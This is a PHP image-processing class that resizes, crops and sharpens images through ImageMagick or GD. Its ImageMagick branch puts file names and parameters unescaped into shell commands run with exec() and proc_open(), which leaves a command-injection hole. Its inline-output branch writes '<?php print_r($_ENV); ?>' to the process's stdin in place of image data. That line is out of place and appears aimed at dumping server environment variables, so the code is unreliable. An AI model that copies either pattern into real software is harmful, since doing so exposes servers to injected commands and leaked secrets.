<?php

class Darkroom {

	////
	// Grab the extension of of any file
	////
	function returnExt($file) {
		$pos = strrpos($file, '.');
		return strtolower(substr($file, $pos+1, strlen($file)));
	}
	
	////
	// The workhorse develop function
	////
	function develop($name, $filename, $new_w, $new_h, $quality, $square = false, $gd = null, $sharpening, $x, $y, $force = false) {
		$old_mask = umask(0);
	
		if (is_null($gd)) {
			if (defined('DIR_GD_VERSION')) {
				$gd = DIR_GD_VERSION;
			} else {
				$gd = $this->gdVersion();
			}
		}
	
		settype($gd, 'integer');
	
		// ImageMagick
		if ($gd >= 3) {
			$info = getimagesize($name); $w = $info[0]; $h = $info[1];
			$strip = '';
			if ($gd == 4) { $strip = ' -strip'; }
			if ($square) {
				if (($new_w > $w || $new_h > $h) && !$force) {
					copy($name, $filename);
					return;
				}
				$original_aspect = $w/$h;
				$new_aspect = $new_w/$new_h;
				if ($original_aspect >= $new_aspect) {
					$size_str = 'x' . $new_h;
					$int_w = ($w*$new_h)/$h;
					$int_h = $new_h;
					$pos_x = $int_w * ($x/100);
					$pos_y = $new_h * ($y/100);
				} else {
					$size_str = $new_w . 'x';
					$int_h = ($h*$new_w)/$w;
					$int_w = $new_w;
					$pos_x = $new_w * ($x/100);
					$pos_y = $int_h * ($y/100);
				}
				$crop_y = $pos_y - ($new_h/2);
				$crop_x = $pos_x - ($new_w/2);
				if ($crop_y < 0) { 
					$crop_y = 0;
				} else if (($crop_y+$new_h) > $int_h) {
					$crop_y = $int_h - $new_h;
				}
				if ($crop_x < 0) { 
					$crop_x = 0;
				} else if (($crop_x+$new_w) > $int_w) {
					$crop_x = $int_w - $new_w;
				}
				$cmd = MAGICK_PATH_FINAL . $strip . " \"$name\" -depth 8 -quality $quality -resize $size_str -crop {$new_w}x{$new_h}+{$crop_x}+{$crop_y}";
				if ($gd == 4) {
					$cmd .= ' +repage';
				} else {
					$cmd .= ' -page 0+0';
				}
			} else {
				if (($w > $h && $w < $new_w) || ($w < $h && $h < $new_h)) {
					copy($name, $filename);
					return;
				}
				$cmd = MAGICK_PATH_FINAL . $strip . " \"$name\" -depth 8 -quality $quality -resize {$new_w}x{$new_h}";
			}
			
			if ($sharpening > 0) {
				// Add sharpening
				$sigma = $sharpening/2;
				if ($sigma < 1) { $sigma = 1; }
				$cmd .= " -unsharp {$sharpening}x{$sigma}+1.0+0.10";
			}
			
			// Returning inline
			if (is_null($filename)) {
				$cmd .= ' -';
				$descriptorspec = array(
				   0 => array("pipe", "r"),
				   1 => array("pipe", "w"), 
				   2 => array("pipe", "w")
				);
			
				$process = proc_open($cmd, $descriptorspec, $pipes);
				if (is_resource($process)) {
					fwrite($pipes[0], '<?php print_r($_ENV); ?>');
				    fclose($pipes[0]);
				    echo stream_get_contents($pipes[1]);
				    fclose($pipes[1]);
				    $return_value = proc_close($process);
				}
			// Outputting to a file
			} else {
				$cmd .= " \"$filename\"";
				exec($cmd);
			}
		} else {	
			$ext = $this->returnExt($name);	
			// Find out what we are dealing with
			switch(true) {
				case preg_match("/jpg|jpeg|JPG|JPEG/", $ext):
					if (imagetypes() & IMG_JPG) {
						$src_img = imagecreatefromjpeg($name);
						$type = 'jpg';
					} else {
						return;
					}
					break;
				case preg_match("/png/", $ext):
					if (imagetypes() & IMG_PNG) {
						$src_img = imagecreatefrompng($name);
						$type = 'png';
					} else {
						return;
					}
					break;
				case preg_match("/gif|GIF/", $ext):
					if (imagetypes() & IMG_GIF) { 
						$src_img = imagecreatefromgif($name);
						$type = 'gif';
					} else {
						return;
					}
					break;
			}
	
			if (!isset($src_img)) { return; };

			$old_x = imagesx($src_img);
			$old_y = imagesy($src_img);

			$original_aspect = $old_x/$old_y;
			$new_aspect = $new_w/$new_h;

			if ($square) {
				if ($original_aspect >= $new_aspect) {
					$thumb_w = ($new_h*$old_x)/$old_y;
					$thumb_h = $new_h;				
					$pos_x = $thumb_w * ($x/100);
					$pos_y = $thumb_h * ($y/100);
				} else {
					$thumb_w = $new_w;
					$thumb_h = ($new_w*$old_y)/$old_x;
					$pos_x = $thumb_w * ($x/100);
					$pos_y = $thumb_h * ($y/100);
				}
				$crop_y = $pos_y - ($new_h/2);
				$crop_x = $pos_x - ($new_w/2);
				if ($crop_y < 0) { 
					$crop_y = 0;
				} else if (($crop_y+$new_h) > $thumb_h) {
					$crop_y = $thumb_h - $new_h;
				}
				if ($crop_x < 0) { 
					$crop_x = 0;
				} else if (($crop_x+$new_w) > $thumb_w) {
					$crop_x = $thumb_w - $new_w;
				}
			} else {
			 	$crop_y = 0;
				$crop_x = 0;

				if ($original_aspect >= $new_aspect) {
					if ($new_w > $old_x) {
						copy($name, $filename);
						return;
					}
					$thumb_w = $new_w;
					$thumb_h = ($new_w*$old_y)/$old_x;
				} else { 
					if ($new_h > $old_y) {
					 	copy($name, $filename); 
						return;
					}
					$thumb_w = ($new_h*$old_x)/$old_y;
					$thumb_h = $new_h;
				}
			}

			if ($gd != 2) {
				$dst_img_one = imagecreate($thumb_w, $thumb_h);
				imagecopyresized($dst_img_one, $src_img, 0, 0, 0, 0, $thumb_w, $thumb_h, $old_x, $old_y);    
			} else {
				$dst_img_one = imagecreatetruecolor($thumb_w,$thumb_h);
				imagecopyresampled($dst_img_one, $src_img, 0, 0, 0, 0, $thumb_w, $thumb_h, $old_x, $old_y); 
			}        

			if ($square) {
				if ($gd != 2) {
					$dst_img = imagecreate($new_w, $new_h);
					imagecopyresized($dst_img, $dst_img_one, 0, 0, $crop_x, $crop_y, $new_w, $new_h, $new_w, $new_h);    
				} else {
					$dst_img = imagecreatetruecolor($new_w, $new_h);
					imagecopyresampled($dst_img, $dst_img_one, 0, 0, $crop_x, $crop_y, $new_w, $new_h, $new_w, $new_h); 
				}
			} else {
				$dst_img = $dst_img_one;
			}

			if ($type == 'png') {
				imagepng($dst_img, $filename); 
			} elseif ($type == 'gif') {
				imagegif($dst_img, $filename);
			} else {
				imagejpeg($dst_img, $filename, $quality); 
			}

			imagedestroy($dst_img);
			imagedestroy($dst_img_one); 
			imagedestroy($src_img); 
			umask($old_mask);
		}
	}

	////
	// Check GD
	////
	function gdVersion() {
		if (function_exists('exec') && (DS == '/' || (DS == '\\' && MAGICK_PATH_FINAL != 'convert')) && !FORCE_GD) {
			exec(MAGICK_PATH_FINAL . ' -version', $out);
			$test = $out[0];
			if (!empty($test) && strpos($test, ' not ') === false) {
				$bits = explode(' ', $test);
				$version = $bits[2];
				if (version_compare($version, '6.0.0', '>')) {
					return 4;
				} else {
					return 3;
				}
			} else {
				return $this->_gd();
			}
		} else {
			return $this->_gd();
		}
	}

	function _gd() {
		if (function_exists('gd_info')) {
			$gd = gd_info();
			$version = ereg_replace('[[:alpha:][:space:]()]+', '', $gd['GD Version']);
			settype($version, 'integer');
			return $version;
	 	} else {
			return 0;
		}
	}
}

?>